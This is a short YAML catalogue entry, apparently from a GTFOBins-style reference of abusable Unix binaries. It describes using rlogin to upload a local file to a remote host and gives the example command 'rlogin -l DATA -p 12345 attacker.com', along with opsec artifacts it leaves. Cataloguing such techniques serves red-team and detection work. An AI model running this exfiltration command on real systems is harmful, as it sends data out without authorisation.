---
name: rlogin
capabilities:
- upload
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: false
examples:
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: rlogin -l DATA -p 12345 attacker.com
  notes: The file is corrupted by leading and trailing spurious data.
references:
- https://gtfobins.github.io/gtfobins/rlogin/
tags: []
---
